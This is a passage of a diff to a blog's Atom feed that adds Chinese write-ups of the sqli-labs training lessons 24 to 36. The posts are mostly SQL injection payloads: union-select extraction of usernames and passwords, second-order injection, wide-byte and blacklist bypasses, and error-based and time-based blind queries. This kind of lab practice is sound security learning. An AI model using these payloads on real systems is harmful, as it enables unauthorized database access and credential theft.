class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&#x27;4&#x27;</span> <span class="attr">color</span>= <span class="string">&quot;#33FFFF&quot;</span>&gt;</span></span><br><span class="line">Hint: The Username you input is escaped as : aß\&#x27; union select 1,2#<span class="tag">&lt;<span class="name">br</span>&gt;</span>Hint: The Password you input is escaped as : n<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>倒数第12行看到我们注入成功了，后面明显我们可以套用联合查询来注入</p><h2 id="网上一直在传的方法二"><a href="#网上一直在传的方法二" class="headerlink" title="网上一直在传的方法二"></a>网上一直在传的方法二</h2><p>get型注入是直接以url形式提交的，而post型就会对数据进行urlencode处理</p><p>所以使</p><p>�’ union select  1,database()#</p><p>来注入,</p><p><img src="https://s2.loli.net/2022/02/14/HjPdvs5g7cJSBXt.png" alt="QQ截图20220214155510.png"></p><p><img src="https://s2.loli.net/2022/02/14/6u7mKTAbo2CPH8Y.png" alt="QQ截图20220214155606.png"></p><h1 id="lesson-35"><a href="#lesson-35" class="headerlink" title="lesson 35"></a>lesson 35</h1><p>首先是多次尝试发现没有对数据进行包裹</p><p>?id=-1 union select 1,database(),3–+</p><p><img src="https://s2.loli.net/2022/02/14/yz4cmQ6qHSXsiEb.png" alt="QQ截图20220214164727.png"></p><p>?id=-1 union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p><img src="https://s2.loli.net/2022/02/14/8df37KGFqsthcvb.png" alt="QQ截图20220214165031.png"></p><p>然后发现连数据都不包裹的，竟然还会把我的单引号注释掉</p><p>使用16进制来绕过注释</p><h2 id="时间（延迟）注入"><a href="#时间（延迟）注入" class="headerlink" title="时间（延迟）注入"></a>时间（延迟）注入</h2><p>?id=1 and if(    length(database())=1,sleep(3),1    )–+</p><p>?id=1 and if(      left(database(),1)=’s’,sleep(3),1     )–+</p><h1 id="lesson-36"><a href="#lesson-36" class="headerlink" title="lesson 36"></a>lesson 36</h1><p>使用了mysql_real_escape_string()函数来进行过滤，对于该函数而言，它会转义</p><p>\x00 \n \r ‘ “ \x1a</p><p>是用单引号来对数据进行包裹</p><p>并且不出以外的有宽字节注入</p><p>?id=-1%df’union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p><img src="https://s2.loli.net/2022/02/14/7p1mGWcyLghszRf.png" alt="QQ截图20220214183150.png"></p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;宽字节注入&quot;&gt;&lt;a href=&quot;#宽字节注入&quot; class=&quot;headerlink&quot; title=&quot;宽字节注入&quot;&gt;&lt;/a&gt;宽字节注入&lt;/h1&gt;&lt;p&gt;宽字节：GB2312、GBK、GB18030、BIG5、shift_JIS等就是常说的宽字节，实际上只有两个字节。宽</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>lesson27_28a</title>
+    <link href="http://example.com/2022/01/31/lesson27/"/>
+    <id>http://example.com/2022/01/31/lesson27/</id>
+    <published>2022-01-31T05:36:21.000Z</published>
+    <updated>2022-02-18T12:26:40.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="lesson27"><a href="#lesson27" class="headerlink" title="lesson27"></a>lesson27</h1><p><img src="https://s2.loli.net/2022/02/11/qPV5SrDFJY23Llb.png" alt="QQ截图20220211160219.png"></p><p>因为没有报错的回显所以我们采用联合查询</p><p>又因为select和union又被过滤，所以我们采用uNion和sElect </p><p>?id=11111’  %0b uNion %0b sElect %0b 1,2,3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/d9YUSojrPWRaHmv.png" alt="QQ截图20220211185056.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,database(),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/v5Fg7dP8WMDxslQ.png" alt="QQ截图20220211185216.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=’security’)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/rKFUIOTysvoJqBl.png" alt="QQ截图20220211185630.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name=’users’)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/ldb9HrIsU8RKqaB.png" alt="QQ截图20220211185828.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(concat_ws(0x7e,username,password)))from(security.users)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/SbZC5cD3FqGHPLW.png" alt="QQ截图20220211190332.png"></p><h1 id="lesson27a"><a href="#lesson27a" class="headerlink" title="lesson27a"></a>lesson27a</h1><p>lesson27a是相同的方法，和lesson27一样</p><p>主要是空格用%a0或者%0b来代替</p><h1 id="lesson-28"><a href="#lesson-28" class="headerlink" title="lesson 28"></a>lesson 28</h1><p>由</p><p><a href="http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=">http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=</a>(‘1</p><p>是（’’）的包裹方式</p><p>我这里采用盲注来做，但是很多师傅的参考都是用联合查询来做的，我的sql-liblesson28抽风了，空格老是被注释了</p><p>?id=0’)||left(database(),2)=’se’;%00</p><p><img src="https://s2.loli.net/2022/02/12/FevtEJ57W81Gx6B.png" alt="QQ截图20220212184908.png"></p><p>盲注爆出库，表，列</p><h1 id="lesson-28a"><a href="#lesson-28a" class="headerlink" title="lesson 28a"></a>lesson 28a</h1><p>同样的payload，lesson28也可以做，所以跳过了</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;lesson27&quot;&gt;&lt;a href=&quot;#lesson27&quot; class=&quot;headerlink&quot; title=&quot;lesson27&quot;&gt;&lt;/a&gt;lesson27&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/11/qPV5S</summary>
+      
+    
+    
+    
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
+    
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>lesson24_26a</title>
+    <link href="http://example.com/2022/01/26/lesson24/"/>
+    <id>http://example.com/2022/01/26/lesson24/</id>
+    <published>2022-01-26T03:14:16.000Z</published>
+    <updated>2022-02-18T12:28:12.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="lesson-24-second-order-injection-二次注入"><a href="#lesson-24-second-order-injection-二次注入" class="headerlink" title="lesson 24 second order injection(二次注入)"></a>lesson 24 second order injection(二次注入)</h1><p>第一步：插入恶意数据</p><p>  第一次进行数据库插入数据的时候 ，仅仅对其中的特殊符号进行转移，在写入数据库的时候还是保留的原来的数据，但是数据本身包含恶意内容。</p><p>第二步：引用恶意数据</p><p>  在将数据存入数据库后，开发者认为数据是可信的，在下一次需要进行的查询的时候，直接从数据库中提取出恶意的数据，没有进行进一步的审查和处理，就会造成sql的二次注入</p><p><img src="https://s2.loli.net/2022/02/10/3epZOLiJ2jVUSN8.png" alt="QQ截图20220210114019.png"></p><p>一开始有一个普通用户</p><p><img src="https://s2.loli.net/2022/02/10/DsGjFoLQ37cxZrT.png" alt="QQ截图20220210130715.png"></p><p>账号：admin</p><p>密码：admin</p><p>然后我们（黑客）注册一个新的账号</p><p><img src="https://s2.loli.net/2022/02/10/HhZUVG63Bp4JleE.png" alt="QQ截图20220210130845.png"></p><p>账号：admin’#        </p><p>密码：123456</p><p>然后登入修改密码。</p><p><img src="https://s2.loli.net/2022/02/10/x1IZWh4JC7HBVE6.png" alt="QQ截图20220210131006.png"></p><img src="https://s2.loli.net/2022/02/10/jMmFSRH2pQwLWbd.png" alt="QQ截图20220210131200.png" style="zoom:150%;" /><p>然后当我们用admin的帐号登入时，发现密码被恶意修改了</p><p><img src="https://s2.loli.net/2022/02/10/TtXzn9W8HoUGPxe.png" alt="QQ截图20220210131303.png"></p><p>这里就是在我们用admin‘#的账号修改密码时，数据库提取我们的恶意数据没有进行转意使得原本用来修改密码的语句:</p><p>UPDATE users SET PASSWORD=’$pass’ where username=’admin’#’ and password=’&amp;curr_pass’</p><p>变成了</p><p>UPDATA users SET PASSWORD=’$pass’ where username=’admin’</p><p>导致密码被修改。。。。</p><h1 id="lesson25"><a href="#lesson25" class="headerlink" title="lesson25"></a>lesson25</h1><p>黑名单里面 ‘or’ ‘and’被过滤了</p><p><img src="https://s2.loli.net/2022/02/10/vYLRFpD6jd8o291.png" alt="QQ截图20220210131449.png"></p><p>用双写来绕过</p><p>数据库</p><p>?id=-1’ union select 1,database(),3 anandd ‘1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/mRkdLg6e8vZbBDy.png" alt="QQ截图20220210163701.png"></p><p>表</p><p>?id=-1’ union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3 anandd ‘1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/javtyi4HwoYlEeK.png" alt="QQ截图20220210165641.png"></p><p>列</p><p>?id=-1’ union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3 anandd ‘1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/78Cobgc6xOWniBr.png" alt="QQ截图20220210170055.png"></p><p>字段</p><p>?id=-1’ union select 1,(select group_concat(concat_ws(‘@@’,id,username,passwoorrd))from users),3 anandd ‘1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/ekXN37wJZHVj14q.png" alt="QQ截图20220210171358.png"></p><p>PS:information和password里面都有or要双写。</p><h1 id="lesson-25a"><a href="#lesson-25a" class="headerlink" title="lesson 25a"></a>lesson 25a</h1><p>与上一关相同</p><p>同样的黑名单过滤了or和and</p><p>就是闭合不同。。。</p><h1 id="lesson26"><a href="#lesson26" class="headerlink" title="lesson26"></a>lesson26</h1><p><img src="https://s2.loli.net/2022/02/10/gePrwp1ZIFacDM2.png" alt="QQ截图20220210173023.png"></p><p>查库</p><p>?id=1’||updatexml(1,concat(0x7e,(database())),1)||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/XaRNkyO5PG3ovUA.png" alt="QQ截图20220210221443.png"></p><p>查表</p><p>?id=1’||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/tB5bxJQDqmkphzl.png" alt="QQ截图20220210221611.png"></p><p>查列</p><p>?id=1’||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’))),1)||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/dJGyOLD13MxXIVW.png" alt="QQ截图20220210221718.png"></p><p>字段</p><p>?id=1’||updatexml(1,concat(0x7e,(select    (group_concat(concat_ws(0x7e,username,passwoorrd))) from (security.users)  )),1)||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/O9I65hUse34rL71.png" alt="QQ截图20220210230328.png"></p><p>%a0也可以充当空格，注释符可以用;%00或者||’1’=’1</p><h1 id="lesson-26a"><a href="#lesson-26a" class="headerlink" title="lesson 26a"></a>lesson 26a</h1><p>黑名单一样只是闭合多了括号</p><p>因为没有报错信息，所以我们只能用联合查询</p><p>黑名单中对空格做了过滤，所以我们可以用%a0来代替空格</p><p>基本与lesson26相同</p><p>?id=1’) %a0 union %a0 select%a0 1,2,3 || (‘1’)=(‘1</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;lesson-24-second-order-injection-二次注入&quot;&gt;&lt;a href=&quot;#lesson-24-second-order-injection-二次注入&quot; class=&quot;headerlink&quot; title=&quot;lesson 24 second o</summary>
+      
+    
+    
+    
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
+    
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
